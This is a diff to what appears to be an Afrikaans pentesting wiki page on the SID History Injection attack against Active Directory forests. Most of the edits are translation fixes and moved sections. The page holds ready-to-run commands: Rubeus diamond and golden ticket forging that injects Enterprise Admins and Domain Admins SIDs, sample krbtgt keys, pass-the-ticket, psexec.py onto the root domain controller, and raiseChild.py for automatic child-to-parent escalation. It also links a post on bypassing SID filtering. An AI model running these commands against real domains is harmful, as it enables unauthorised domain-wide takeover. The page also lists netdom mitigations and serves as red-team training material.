@@ -4,7 +4,7 @@
 
 ## SID History Inspuiting Aanval
 
-Die fokus van die **SID History Inspuiting Aanval** is om **gebruikermigrasie tussen domeine** te ondersteun terwyl toegang tot hulpbronne van die vorige domein verseker word. Dit word bereik deur **die gebruiker se vorige Veiligheidsidentifiseerder (SID) in die SID Geskiedenis** van hul nuwe rekening in te sluit. Dit is belangrik om te noem dat hierdie proses gemanipuleer kan word om ongemagtigde toegang te verleen deur die SID van 'n hoë-privilege groep (soos Enterprise Admins of Domain Admins) van die ouer domein by die SID Geskiedenis te voeg. Hierdie uitbuiting bied toegang tot alle hulpbronne binne die ouer domein.
+Die fokus van die **SID History Inspuiting Aanval** is om **gebruikermigrasie tussen domeine** te ondersteun terwyl toegang tot hulpbronne van die vorige domein verseker word. Dit word bereik deur **die gebruiker se vorige Veiligheidsidentifiseerder (SID) in die SID Geskiedenis** van hul nuwe rekening in te sluit. Dit is belangrik om te noem dat hierdie proses gemanipuleer kan word om ongeoorloofde toegang te verleen deur die SID van 'n hoë-privilege groep (soos Enterprise Admins of Domain Admins) van die ouer domein by die SID Geskiedenis te voeg. Hierdie uitbuiting bied toegang tot alle hulpbronne binne die ouer domein.
 
 Twee metodes bestaan om hierdie aanval uit te voer: deur die skep van 'n **Golden Ticket** of 'n **Diamond Ticket**.
 
@@ -13,8 +13,36 @@ Om die SID vir die **"Enterprise Admins"** groep te bepaal, moet 'n mens eers di
 Jy kan ook die **Domain Admins** groepe gebruik, wat eindig op **512**.
 
 'n Ander manier om die SID van 'n groep van die ander domein (byvoorbeeld "Domain Admins") te vind, is met:
-```powershell
+```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
+```
+> [!WARNING]
+> Let daarop dat dit moontlik is om SID-geskiedenis in 'n vertrouensverhouding te deaktiveer, wat hierdie aanval sal laat misluk.
+
+Volgens die [**docs**](https://technet.microsoft.com/library/cc835085.aspx):
+- **Deaktiveer SIDHistory op woudvertroue** met die netdom-gereedskap (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Pas SID Filter Quarantining toe op eksterne vertroue** met die netdom-gereedskap (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Pas SID Filtering toe op domeinvertroue binne 'n enkele woud** word nie aanbeveel nie, aangesien dit 'n onondersteunde konfigurasie is en breekveranderinge kan veroorsaak. As 'n domein binne 'n woud onbetroubaar is, moet dit nie 'n lid van die woud wees nie. In hierdie situasie is dit nodig om eers die vertroude en onbetroubare domeine in aparte woude te verdeel waar SID Filtering op 'n interforest vertroue toegepas kan word.
+
+Kyk na hierdie pos vir meer inligting oor om dit te omseil: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+
+### Diamond Ticket (Rubeus + KRBTGT-AES256)
+
+Laas keer toe ek dit probeer het, moes ek die arg **`/ldap`** byvoeg.
+```bash
+# Use the /sids param
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
+
+# Or a ptt with a golden ticket
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+#e.g.
+
+execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd
+
+# You can use "Administrator" as username or any other string
 ```
 ### Goue Kaart (Mimikatz) met KRBTGT-AES256
 ```bash
@@ -39,17 +67,8 @@ Vir meer inligting oor goue kaartjies, kyk:
 golden-ticket.md
 {{#endref}}
 
-### Diamantkaartjie (Rubeus + KRBTGT-AES256)
-```powershell
-# Use the /sids param
-Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
 
-# Or a ptt with a golden ticket
-Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt
-
-# You can use "Administrator" as username or any other string
-```
-Vir meer inligting oor diamond tickets, kyk na:
+Vir meer inligting oor diamant kaartjies, kyk:
 
 {{#ref}}
 diamond-ticket.md
@@ -99,9 +118,9 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Outomaties met [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Automaties met [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-Dit is 'n Impacket-skrip wat **outomaties die opgradering van kind- na ouer-domein** sal hanteer. Die skrip benodig:
+Dit is 'n Impacket-skrip wat **die opgradering van kind na ouer domein outomatiseer**. Die skrip benodig:
 
 - Teikendomeinbeheerder
 - Kredensies vir 'n admin gebruiker in die kinddomein
@@ -109,10 +128,10 @@ Dit is 'n Impacket-skrip wat **outomaties die opgradering van kind- na ouer-dome
 Die vloei is:
 
 - Verkry die SID vir die Enterprise Admins-groep van die ouerdomein
-- Verkry die hash vir die KRBTGT-rekening in die kinddomein
-- Skep 'n Goue Tiket
+- Herwin die hash vir die KRBTGT-rekening in die kinddomein
+- Skep 'n Golden Ticket
 - Meld aan by die ouerdomein
-- Verkry kredensies vir die Administrateur-rekening in die ouerdomein
+- Herwin kredensies vir die Administrator-rekening in die ouerdomein
 - As die `target-exec` skakel gespesifiseer is, verifieer dit by die ouerdomein se Domeinbeheerder via Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
